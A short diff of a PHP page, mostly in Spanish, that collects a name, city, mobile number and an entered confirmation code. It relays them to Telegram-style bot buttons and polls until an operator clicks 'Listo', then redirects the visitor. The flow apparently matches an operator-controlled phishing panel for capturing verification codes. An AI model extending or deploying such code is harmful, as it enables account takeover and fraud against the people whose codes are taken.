@@ -136,7 +136,7 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
                 ],
                 [
                     'text' => '✅ Listo',
-                    'url'  => $URL_FINALIZADO,
+                    'callback_data' => 'LISTO|' . $celular,
                 ],
             ],
         ],
@@ -189,7 +189,7 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
                 ],
                 [
                     'text' => '✅ Listo',
-                    'url'  => $URL_FINALIZADO,
+                    'callback_data' => 'LISTO|' . $telefono,
                 ],
             ],
         ],
@@ -224,7 +224,11 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
                 .then(function(r){ return r.json(); })
                 .then(function(data){
                   if (data && data.ready) {
-                    window.location.href = 'procesar.php';
+                    if (data.type === 'done') {
+                      window.location.href = 'finalizado.html';
+                    } else {
+                      window.location.href = 'procesar.php';
+                    }
                   }
                 })
                 .catch(function(e){ /* ignorar errores momentáneos */ });
